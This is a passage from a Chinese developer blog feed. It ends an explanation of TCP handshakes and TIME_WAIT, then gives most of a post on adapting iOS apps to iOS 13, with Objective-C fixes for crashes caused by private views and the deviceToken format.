<code>SYN</code> 包；4. 客户端返回 <code>ACK</code>包。</li><li>如果只有两次握手，也就是到第 2 步就建立连接，这样只有客户端确认服务端就绪，服务端则无法确定客户端就绪。假设 ACK 包丢失了，服务端在不知情的情况下开始发送数据，客户端只接收 ACK 包而忽略发来的数据，服务端没收到响应而一直发相同数据，从而会形成<strong>死锁</strong>。</li><li>而 TCP 中，第 2、3 步是可以同时完成的，因此这两步的包合成一个 <code>SYN + ACK</code> 包，因此只需要三次握手即可完成建立连接。</li></ol><p>同样，断开连接也是如此，双方需要关闭各自的通路。</p><ol><li>和建立连接类似，首先向对方发送 <code>FIN</code> 包，对方收到后返回 <code>ACK</code>包，这样就可以关闭自己的通路。整体的流程为：1.客户端发送 <code>FIN</code>包；2. 服务端返回 <code>ACK</code> 包；3. 服务端发送 <code>FIN</code> 包；4. 客户端返回 <code>ACK</code>包。</li><li>和建立连接不同的是，在第 2 步服务端返回 <code>ACK</code> 包时，服务端可能还有数据没有发完，因此不能立即进行第 3 步发送，需要等数据发送完才能向客户端发 <code>FIN</code> 包断开连接。因此需要完整的四次挥手。</li></ol></li><li><p>为什么第四次挥手时，客户端进入 <code>TIME_WAIT</code> 状态而不是直接关闭？</p><ol><li>假如第四次挥手时客户端直接进入<code>CLOSED</code>状态，然而发送的 <code>ACK</code>包丢失了，服务端在超时后会重发<code>FIN</code>包，这时因为客户端已经进入了<code>CLOSED</code>状态，返回的不是<code>ACK</code>包，而是<code>RST</code>包，服务端接收到 <code>RST</code>会认为连接错误，无法进入关闭状态，从而导致 TCP 协议不可靠。</li><li>另一个原因是需要让旧数据包过期消失，假如客户端发送 <code>SYN</code>超时了，重发一次才成功建立连接，然后完成数据交互并断开了连接。这时假设第一次发送超时的请求终于到了，这个请求本应是无效的，服务端在不知情的情况下又再次建立连接。等待 2MSL 的目的就是让这种旧的数据包过期失效，因此如果在关闭连接后马上重连，就会出现端口不可用的情况。2 倍 MSL 时间是一个发送和一个回复所需要的最大时间。</li></ol></li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;网络基础知识&quot;&gt;&lt;a href=&quot;#网络基础知识&quot; class=&quot;headerlink&quot; title=&quot;网络基础知识&quot;&gt;&lt;/a&gt;网络基础知识&lt;/h3&gt;&lt;ol&gt;
&lt;li&gt;&lt;p&gt;网络构成的要素：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;网卡&lt;/strong&gt;：使计算
      
    
    </summary>
    
    
    
      <category term="Network" scheme="http://xsenyu.github.io/tags/Network/"/>
    
  </entry>
  
  <entry>
    <title>iOS 13 适配要点总结</title>
    <link href="http://xsenyu.github.io/2019/08/09/iOS13%E9%80%82%E9%85%8D%E8%A6%81%E7%82%B9%E6%80%BB%E7%BB%93/"/>
    <id>http://xsenyu.github.io/2019/08/09/iOS13%E9%80%82%E9%85%8D%E8%A6%81%E7%82%B9%E6%80%BB%E7%BB%93/</id>
    <published>2019-08-09T07:56:00.000Z</published>
    <updated>2020-04-06T13:14:28.067Z</updated>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer">本文在 [掘金](https://juejin.im/user/5d8af836518825093a357646/posts) 也持续更新。## iOS 13 支持适配的机型* iPhone 11、iPhone 11 Pro、iPhone 11 Pro Max* iPhone X、iPhone XR、iPhone XS、iPhone XS Max* iPhone 8、iPhone 8 Plus* iPhone 7、iPhone 7 Plus* iPhone 6s、iPhone 6s Plus* iPhone SE* iPod touch (第七代)* 后续发布的新版本 iPhone<h2 id="适配时间节点要求"><a href="#适配时间节点要求" class="headerlink" title="适配时间节点要求"></a>适配时间节点要求</h2><blockquote><p>2019 年 11 月 5 日</p></blockquote><p>苹果在当天正式弃用 <code>Xcode 11.2</code> 版本，需要更新至 <code>Xcode 11.2.1</code> 或之后的版本进行打包提审。</p><blockquote><p>2020 年 6 月 30 日</p></blockquote><p><em>苹果在 2020.03.26 延迟了适配的时间节点，可见 <a href="https://developer.apple.com/news/?id=03262020b" target="_blank" rel="noopener">Deadline for App Updates has Been Extended</a></em></p><ol><li>所有提交到 <code>AppStore</code> 的新应用和应用更新必须使用 <code>iOS 13</code> 的 SDK 进行<strong>编译打包</strong>。并支持所有对应所有设备的屏幕尺寸，详请可见 <a href="https://developer.apple.com/news/?id=03042020b" target="_blank" rel="noopener">Submit Your iPhone Apps to the App Store</a> 以及 <a href="https://developer.apple.com/news/?id=03042020c" target="_blank" rel="noopener">Submit Your iPad Apps to the App Store</a> ；</li><li>所有应用必须使用 <code>Xcode</code> <code>storyboard</code> 提供支持所有屏幕尺寸的<strong>启动界面</strong>，详请可见 <a href="https://developer.apple.com/news/?id=01132020b" target="_blank" rel="noopener">Building Adaptive User Interfaces for iPhone and iPad</a>;</li><li><strong>现有</strong>的应用和应用中，更新符合苹果审核规则中关于接入 <code>Sign In With Apple</code> 功能要求的必须进行接入 ，具体要求可以见下文内容。</li><li>所有 AppWatch 应用必须使用 <code>watchOS 6</code> 或之后版本的 SDK 进行<strong>编译打包</strong>。</li><li>Kids category 中的应用必须符合审核指南中的 guideline 1.3 、guideline 5.1.4。</li><li>使用 HTML 5 的应用必须符合审核指南的 guideline 4.7 sections 4, 5, and 6。</li></ol><blockquote><p>2020 年 4 月</p></blockquote><p><strong>新应用</strong>必须使用 <code>WKWebView</code> 代替 <code>UIWebView</code>，详请可见 <a href="https://developer.apple.com/news/?id=12232019b" target="_blank" rel="noopener">Updating Apps that Use Web Views</a>；</p><blockquote><p>2020 年 12 月</p></blockquote><p><strong>应用更新</strong>必须使用 <code>WKWebView</code> 代替 <code>UIWebView</code>，详请可见 <a href="https://developer.apple.com/news/?id=12232019b" target="_blank" rel="noopener">Updating Apps that Use Web Views</a>；</p><h2 id="新特性适配"><a href="#新特性适配" class="headerlink" title="新特性适配"></a>新特性适配</h2><h3 id="1-Dark-Mode"><a href="#1-Dark-Mode" class="headerlink" title="1. Dark Mode"></a>1. Dark Mode</h3><p>iOS 13 推出暗黑模式，<code>UIKit</code> 提供新的系统颜色和 api 来适配不同颜色模式，<code>xcassets</code> 对素材适配也做了调整，具体适配可见: <a href="https://developer.apple.com/videos/play/wwdc2019/214/" target="_blank" rel="noopener">Implementing Dark Mode on iOS</a>。</p><p>Dark Mode 不是必须适配，但前提是你需要确保应用在切换主题后不会影响到用户使用（比如说文字和背景颜色相同可能会影响使用）。如果不打算适配 Dark Mode，可以直接在 <code>Info.plist</code> 中添加一栏：<code>User Interface Style</code> : <code>Light</code>，即可在应用内禁用暗黑模式。</p><p>另外，即使设置了颜色方案，申请权限的系统弹窗还是会依据系统的颜色进行显示，自己创建的 <code>UIAlertController</code> 就不会。</p><h3 id="2-Sign-In-with-Apple"><a href="#2-Sign-In-with-Apple" class="headerlink" title="2. Sign In with Apple"></a>2. Sign In with Apple</h3><p>在 iOS 13 中苹果推出一种在 App 和网站上快速、便捷登录的方式: <a href="https://developer.apple.com/videos/play/wwdc2019/706/" target="_blank" rel="noopener">Sign In With Apple</a>。这是 iOS 13 新增的功能，因此需要使用 Xcode 11 进行开发。关于应用是否要求接入此登录方式，苹果在 <a href="https://developer.apple.com/app-store/review/guidelines/#sign-in-with-apple" target="_blank" rel="noopener">App Store 应用审核指南</a> 中提到：</p><blockquote><p>Apps that exclusively use a third-party or social login service (such as Facebook Login, Google Sign-In, Sign in with Twitter, Sign In with LinkedIn, Login with Amazon, or WeChat Login) to set up or authenticate the user’s primary account with the app must also offer Sign in with Apple as an equivalent option. </p></blockquote><p>如果你的应用使用了<strong>第三方或社交账号登录服务</strong>（如Facebook、Google、Twitter、LinkedIn、Amazon、微信等）来设置或验证用户的主账号，就必须把 <code>Sign In With Apple</code> 作为同等的选项添加到应用上。如果是下面这些类型的应用则<strong>不需要</strong>添加：</p><ul><li><strong>仅仅</strong>使用公司<strong>内部账号</strong>来注册和登录的应用；</li><li>要求用户使用<strong>现有的</strong>教育或企业账号进行登录的教育、企业或商务类型的应用；</li><li>使用<strong>政府或业界支持</strong>的公民身份识别系统或电子标识对用户进行身份验证的应用；</li><li>特定第三方服务的应用，用户需要直接登录其邮箱、社交媒体或其他第三方帐户才能访问其内容。</li></ul><p>另外需要注意，关于何时要求接入 <code>Sign In With Apple</code>，苹果在 <a href="https://developer.apple.com/news/" target="_blank" rel="noopener">News and Updates</a> 中提到：</p><blockquote><p>Starting today, new apps submitted to the App Store must follow these guidelines. Existing apps and app updates must follow them by April 2020. </p></blockquote><p>2019 年 9 月 12 日 起，提交到 App Store 的<strong>新应用</strong>必须按照应用审核指南中的标准进行接入；<strong>现有</strong>应用和应用更新必须也在 2020 年 4 月前完成接入。</p><h2 id="API-适配"><a href="#API-适配" class="headerlink" title="API 适配"></a>API 适配</h2><h3 id="1-私有方法-KVC-可能导致崩溃"><a href="#1-私有方法-KVC-可能导致崩溃" class="headerlink" title="1. 私有方法 KVC 可能导致崩溃"></a>1. <span id="api">私有方法 KVC 可能导致崩溃</span></h3><p>在 iOS 13 中<strong>部分</strong>方法属性不允许使用 <code>valueForKey</code>、<code>setValue:forKey:</code>  来获取或者设置私有属性，具体表现为在运行时会直接崩溃，并提示以下崩溃信息：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*** Terminating app due to uncaught exception &#39;NSGenericException&#39;, reason: &#39;Access to UISearchBar&#39;s _searchField ivar is prohibited. This is an application bug&#39;</span><br></pre></td></tr></table></figure><h4 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h4><p>目前整理的会导致崩溃的私有 api 和对应替代方案如下，感谢 <a href="https://juejin.im/user/57ad34026be3ff006b91c1f3" target="_blank" rel="noopener">@君赏</a> 的反馈，也欢迎各位大佬补充和指正 ：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 崩溃 api</span><br><span class="line">UITextField *textField &#x3D; [searchBar valueForKey:@&quot;_searchField&quot;];</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 替代方案 1，使用 iOS 13 的新属性 searchTextField</span><br><span class="line">searchBar.searchTextField.placeholder &#x3D; @&quot;search&quot;;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 替代方案 2，遍历获取指定类型的属性</span><br><span class="line">- (UIView *)findViewWithClassName:(NSString *)className inView:(UIView *)view&#123;</span><br><span class="line">    Class specificView &#x3D; NSClassFromString(className);</span><br><span class="line">    if ([view isKindOfClass:specificView]) &#123;</span><br><span class="line">        return view;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if (view.subviews.count &gt; 0) &#123;</span><br><span class="line">        for (UIView *subView in view.subviews) &#123;</span><br><span class="line">            UIView *targetView &#x3D; [self findViewWithClassName:className inView:subView];</span><br><span class="line">            if (targetView !&#x3D; nil) &#123;</span><br><span class="line">                return targetView;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    return nil;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 调用方法</span><br><span class="line"> UITextField *textField &#x3D; [self findViewWithClassName:@&quot;UITextField&quot; inView:_searchBar];</span><br></pre></td></tr></table></figure><hr><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 崩溃 api</span><br><span class="line">[searchBar setValue:@&quot;取消&quot; forKey:@&quot;_cancelButtonText&quot;];</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 替代方案，用同上的方法找到子类中 UIButton 类型的属性，然后设置其标题</span><br><span class="line">UIButton *cancelButton &#x3D; [self findViewWithClassName:NSStringFromClass([UIButton class]) inView:searchBar];</span><br><span class="line">[cancelButton setTitle:@&quot;取消&quot; forState:UIControlStateNormal];</span><br></pre></td></tr></table></figure><hr><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 崩溃 api。获取 _placeholderLabel 不会崩溃，但是获取 _placeholderLabel 里的属性就会</span><br><span class="line">[textField setValue:[UIColor blueColor] forKeyPath:@&quot;_placeholderLabel.textColor&quot;];</span><br><span class="line">[textField setValue:[UIFont systemFontOfSize:20] forKeyPath:@&quot;_placeholderLabel.font&quot;];</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 替代方案 1，去掉下划线，访问 placeholderLabel</span><br><span class="line">[textField setValue:[UIColor blueColor] forKeyPath:@&quot;placeholderLabel.textColor&quot;];</span><br><span class="line">[textField setValue:[UIFont systemFontOfSize:20] forKeyPath:@&quot;placeholderLabel.font&quot;];</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 替代方案 2</span><br><span class="line">textField.attributedPlaceholder &#x3D; [[NSAttributedString alloc] initWithString:@&quot;输入&quot; attributes:@&#123;</span><br><span class="line">    NSForegroundColorAttributeName: [UIColor blueColor],</span><br><span class="line">    NSFontAttributeName: [UIFont systemFontOfSize:20]</span><br><span class="line">&#125;];</span><br></pre></td></tr></table></figure><h3 id="2-推送的-deviceToken-获取到的格式发生变化"><a href="#2-推送的-deviceToken-获取到的格式发生变化" class="headerlink" title="2. 推送的 deviceToken 获取到的格式发生变化"></a>2. 推送的 deviceToken 获取到的格式发生变化</h3><p>原本可以直接将 <code>NSData</code> 类型的 <code>deviceToken</code> 转换成 <code>NSString</code> 字符串，然后替换掉多余的符号即可：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">- (void)application:(UIApplication *)application didRegisterForRemoteNotificationsWithDeviceToken:(NSData *)deviceToken &#123;</span><br><span class="line">    NSString *token &#x3D; [deviceToken description];</span><br><span class="line">    for (NSString *symbol in @[@&quot; &quot;, @&quot;&lt;&quot;, @&quot;&gt;&quot;, @&quot;-&quot;]) &#123;</span><br><span class="line">        token &#x3D; [token stringByReplacingOccurrencesOfString:symbol withString:@&quot;&quot;];</span><br><span class="line">    &#125;</span><br><span class="line">    NSLog(@&quot;deviceToken:%@&quot;, token);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在 iOS 13 中，这种方法已经失效，<code>NSData</code>类型的 deviceToken 转换成的字符串变成了：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;length &#x3D; 32, bytes &#x3D; 0xd7f9fe34 69be14d1 fa51be22 329ac80d ... 5ad13017 b8ad0736 &#125;</span><br></pre></td></tr></table></figure><h4 id="解决方案-1"><a href="#解决方案-1" class="headerlink" title="解决方案"></a>解决方案</h4><p>需要进行一次数据格式处理，<a href="https://developer.umeng.com/docs/66632/detail/126489" target="_blank" rel="noopener">友盟</a>提供了一种做法，可以适配新旧系统：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;arpa&#x2F;inet.h&gt;</span><br><span class="line">- (void)application:(UIApplication *)application didRegisterForRemoteNotificationsWithDeviceToken:(NSData *)deviceToken &#123;</span><br><span class="line">    if (![deviceToken isKindOfClass:[NSData class]]) return;</span><br><span class="line">    const unsigned *tokenBytes &#x3D; [deviceToken bytes];</span><br><span class="line">    &#x2F;&#x2F; 数据格式处理</span><br><span class="line">    NSString *hexToken &#x3D; [NSString stringWithFormat:@&quot;%08x%08x%08x%08x%08x%08x%08x%08x&quot;,</span><br><span class="line">                          ntohl(tokenBytes[0]), ntohl(tokenBytes[1]), ntohl(tokenBytes[2]),</span><br><span class="line">                          ntohl(tokenBytes[3]), ntohl(tokenBytes[4]), ntohl(tokenBytes[5]),</span><br><span class="line">                          ntohl(tokenBytes[6]), ntohl(tokenBytes[7])];</span><br><span class="line">    NSLog(@&quot;deviceToken:%@&quot;, hexToken);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是注意到这种方法限定了长度，而<a href="https://developer.apple.com/documentation/uikit/uiapplicationdelegate/1622958-application?language=objc" target="_blank" rel="noopener">官网文档</a>对此方法的说明中提到，<em>APNs device tokens are of variable length. Do not hard-code their size.</em> ，因此可以对数据格式处理部分进行优化：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">- (void)application:(UIApplication *)application didRegisterForRemoteNotificationsWithDeviceToken:(NSData *)deviceToken &#123;</span><br><span class="line">    if (![deviceToken isKindOfClass:[NSData class]]) &#123;</span><br><span class="line">        return;</span><br><span class="line">    &#125;</span><br><span class="line">    const unsigned char *tokenBytes &#x3D; deviceToken.bytes; </span><br><span class="line">    NSInteger count &#x3D; deviceToken.length;</span><br><span class="line">    </span><br><span class="line">    &#x2F;&#x2F; 数据格式处理</span><br><span class="line">    NSMutableString *hexToken &#x3D; [NSMutableString string];</span><br><span class="line">    for (int i &#x3D; 0; i &lt; count; ++i) &#123;</span><br><span class="line">        [hexToken appendFormat:@&quot;%02x&quot;, tokenBytes[i]];</span><br><span class="line">    &#125;</span><br><span class="line">    NSLog(@&quot;deviceToken:%@&quot;, hexToken);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-模态视图的默认样式发生改变"><a href="#3-模态视图的默认样式发生改变" class="headerlink" title="3. 模态视图的默认样式发生改变"></a>3. <span id="present">模态视图的默认样式发生改变</span></h3><p>在 iOS 13，使用 <code>presentViewController</code> 方式打开模态视图，默认的如下图所示的视差效果，通过下滑返回。</p><p><img src="https://user-gold-cdn.xitu.io/2019/9/25/16d66db07ffd0894?w=300&h=620&f=gif&s=472271" alt="UIModalPresentationAutomatic"></p><p>这是因为苹果将 <code>UIViewController</code> 的 <code>modalPresentationStyle</code> 属性的默认值改成了新加的一个枚举值  <a href="https://developer.apple.com/documentation/uikit/uimodalpresentationstyle/uimodalpresentationautomatic?language=objc" target="_blank" rel="noopener">UIModalPresentationAutomatic</a>，对于多数 <code>UIViewController</code>，此值会映射成 <code>UIModalPresentationPageSheet</code>。</p><p>需要注意，这种效果弹出来的页面导航栏部分是会被砍掉的，在 storyboard 中也可以看到，页面布局时需要注意导航栏的内容不要被遮挡。</p><p><img src="https://user-gold-cdn.xitu.io/2019/9/25/16d66db08020a579?w=300&h=221&f=png&s=49603" alt="Storyboard"></p><p>还有一点注意的是，我们原来以全屏的样式弹出一个页面，那么将这个页面弹出的那个 ViewController 会依次调用 <code>viewWillDisappear</code> 和 <code>viewDidDisappear</code>。然后在这个页面被 dismiss 的时候，将他弹出的那个 ViewController 的 <code>viewWillAppear</code> 和 <code>viewDidAppear</code> 会被依次调用。然而使用默认的视差效果弹出页面，将他弹出的那个 ViewController 并不会调用这些方法，原先写在这四个函数中的代码以后都有可能会存在问题。</p><h4 id="解决方案-2"><a href="#解决方案-2" class="headerlink" title="解决方案"></a>解决方案</h4><p>如果视差效果的样式可以接受的话，就不需要修改；如果需要改回全屏显示的界面，需要手动设置弹出样式：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">- (UIModalPresentationStyle)modalPresentationStyle &#123;</span><br><span class="line">    return UIModalPresentationFullScreen;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="4-UISearchBar-黑线处理导致崩溃"><a href="#4-UISearchBar-黑线处理导致崩溃" class="headerlink" title="4. UISearchBar 黑线处理导致崩溃"></a>4. UISearchBar 黑线处理导致崩溃</h3><p>之前为了处理搜索框的黑线问题，通常会遍历 searchBar 的 subViews，找到并删除 <code>UISearchBarBackground</code>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">for (UIView *view in _searchBar.subviews.lastObject.subviews) &#123;</span><br><span class="line">    if ([view isKindOfClass:NSClassFromString(@&quot;UISearchBarBackground&quot;)]) &#123;</span><br><span class="line">        [view removeFromSuperview];</span><br><span class="line">        break;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在 iOS13 中这么做会导致 UI 渲染失败，然后直接崩溃，崩溃信息如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*** Terminating app due to uncaught exception &#39;NSInternalInconsistencyException&#39;, reason: &#39;Missing or detached view for search bar layout&#39;</span><br></pre></td></tr></table></figure><h4 id="解决方案-3"><a href="#解决方案-3" class="headerlink" title="解决方案"></a>解决方案</h4><p>设置 <code>UISearchBar</code> 的背景图片为空:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[_searchBar setBackgroundImage:[UIImage new]];</span><br></pre></td></tr></table></figure><h3 id="5-UITabBarButton-不同状态下结构不同"><a href="#5-UITabBarButton-不同状态下结构不同" class="headerlink" title="5. UITabBarButton 不同状态下结构不同"></a>5. UITabBarButton 不同状态下结构不同</h3><p>在 iOS 13 中，<code>UITabBarButton</code> 的控件结构会随着其选中状态的变化而变化，主要体现为 <code>UITabBarSwappableImageView</code> 和 <code>UITabBarButtonLabel</code> 的位置变化。在选中时和以前一样，是 <code>UITabBarButton</code> 的子控件。而在未选中状态下放到了 <code>UIVisualEffectView</code> 的 <code>_UIVisualEffectContentView</code> 里面。感谢<a href="https://juejin.im/user/5b8732a251882542ec199ec8" target="_blank" rel="noopener">@关灯侠</a>的提醒，具体可以看下图的对比：</p><p><img src="https://user-gold-cdn.xitu.io/2019/10/9/16daf5e8a8c46820?w=300&h=203&f=png&s=95716" alt="UITabBarButton"></p><p>我们在自定义 <code>UITabBar</code> 时，通常会遍历 <code>UITabBarButton</code> 的子控件获取 <code>UITabBarSwappableImageView</code>，比如自定义红点时添加到这个 ImageView 的右上角，这在 iOS 13 中可能就会导致异常。</p><h4 id="解决方案-4"><a href="#解决方案-4" class="headerlink" title="解决方案"></a>解决方案</h4><p>可以使用递归遍历 <code>UITabBarButton</code> 的所有 subviews 获取 <code>UITabBarSwappableImageView</code>，具体可以参照上面 <a href="#api">私有方法 KVC 可能导致崩溃</a> 章节中给出的递归遍历方法。</p><p>另外需要注意，未选中状态下，添加的红点会和 tabBar 的图片一样变成灰色，这一点应该也是因为其结构变化造成的。具体可以见下图：</p><p><img src="https://user-gold-cdn.xitu.io/2019/10/9/16daf8347a6c5949?w=300&h=55&f=png&s=5354" alt="UITabBar color"></p><p>如果想要和以前一样未选中时也是红色，也很简单，把红点添加到 <code>UITabBarButton</code> 上，位置再根据 <code>UITabBarSwappableImageView</code> 调整即可。</p><h3 id="6-UINavigationBar-设置按钮边距导致崩溃"><a href="#6-UINavigationBar-设置按钮边距导致崩溃" class="headerlink" title="6. UINavigationBar 设置按钮边距导致崩溃"></a>6. UINavigationBar 设置按钮边距导致崩溃</h3><p>从 iOS 11 开始，<code>UINavigationBar</code> 使用了自动布局，左右两边的按钮到屏幕之间会有 16 或 20 的边距。</p><p><img src="https://user-gold-cdn.xitu.io/2019/10/10/16db3abfd5976756?w=300&h=153&f=png&s=9504" alt="distance"><br>为了避免点击到间距的空白处没有响应，通常做法是：定义一个 <code>UINavigationBar</code> 子类，重写 <code>layoutSubviews</code> 方法，在此方法里遍历 subviews 获取 <code>_UINavigationBarContentView</code>，并将其 <code>layoutMargins</code> 设置为 <code>UIEdgeInsetsZero</code>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">- (void)layoutSubviews &#123;</span><br><span class="line">    [super layoutSubviews];</span><br><span class="line">    </span><br><span class="line">    for (UIView *subview in self.subviews) &#123;</span><br><span class="line">        if ([NSStringFromClass([subview class]) containsString:@&quot;_UINavigationBarContentView&quot;]) &#123;</span><br><span class="line">            subview.layoutMargins &#x3D; UIEdgeInsetsZero;</span><br><span class="line">            break;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然而，这种做法在 iOS 13 中会导致崩溃，崩溃信息如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*** Terminating app due to uncaught exception &#39;NSInternalInconsistencyException&#39;, reason: &#39;Client error attempting to change layout margins of a private view&#39;</span><br></pre></td></tr></table></figure><h4 id="解决方案-5"><a href="#解决方案-5" class="headerlink" title="解决方案"></a>解决方案</h4><p>使用设置 frame 的方式，让 <code>_UINavigationBarContentView</code> 向两边伸展，从而抵消两边的边距。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">- (void)layoutSubviews &#123;</span><br><span class="line">    [super layoutSubviews];</span><br><span class="line">    </span><br><span class="line">    for (UIView *subview in self.subviews) &#123;</span><br><span class="line">        if ([NSStringFromClass([subview class]) containsString:@&quot;_UINavigationBarContentView&quot;]) &#123;</span><br><span class="line">            if ([UIDevice currentDevice].systemVersion.floatValue &gt;&#x3D; 13.0) &#123;</span><br><span class="line">                UIEdgeInsets margins &#x3D; subview.layoutMargins;</span><br><span class="line">                subview.frame &#x3D; CGRectMake(-margins.left, -margins.top, margins.left + margins.right + subview.frame.size.width, margins.top + margins.bottom + subview.frame.size.height);</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                subview.layoutMargins &#x3D; UIEdgeInsetsZero;</span><br><span class="line">            &#125;</span><br><span class="line">            break;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="7-子线程修改界面导致崩溃（相册首次授权回调必现）"><a href="#7-子线程修改界面导致崩溃（相册首次授权回调必现）" class="headerlink" title="7. 子线程修改界面导致崩溃（相册首次授权回调必现）"></a>7. 子线程修改界面导致崩溃（相册首次授权回调必现）</h3><p>在使用相册时我们会调用 <code>[PHPhotoLibrary requestAuthorization:]</code> 方法获取权限，获取的结果会通过一个带有 <code>PHAuthorizationStatus</code> 信息的 block 进行回调。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[PHPhotoLibrary requestAuthorization:^(PHAuthorizationStatus status) &#123;</span><br><span class="line">    &#x2F;&#x2F; 根据 status 判断不同状态</span><br><span class="line">&#125;];</span><br></pre></td></tr></table></figure><p>根据 <a href="https://juejin.im/user/5c7c90c66fb9a049d132dcb9" target="_blank" rel="noopener">@路随心生</a> 的反馈，在 iOS 13 中，如果在第一次获取权限的回调中直接修改界面，会导致崩溃，崩溃信息如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">This application is modifying the autolayout engine from a background thread after the engine was accessed from the main thread. This can lead to engine corruption and weird crashes.</span><br><span class="line"></span><br><span class="line">*** Terminating app due to uncaught exception &#39;NSInternalInconsistencyException&#39;, reason: &#39;Modifications to the layout engine must not be performed from a background thread after it has been accessed from the main thread.&#39;</span><br></pre></td></tr></table></figure><p>实际测试，第一次授权崩溃必先，再次授权偶现。另外，正如崩溃信息所言，不只是相册授权回调线程，其他子线程修改界面都有一定概率导致崩溃，而在 iOS 13 中貌似概率更高。</p><h4 id="解决方案-6"><a href="#解决方案-6" class="headerlink" title="解决方案"></a>解决方案</h4><p>在 Xcode 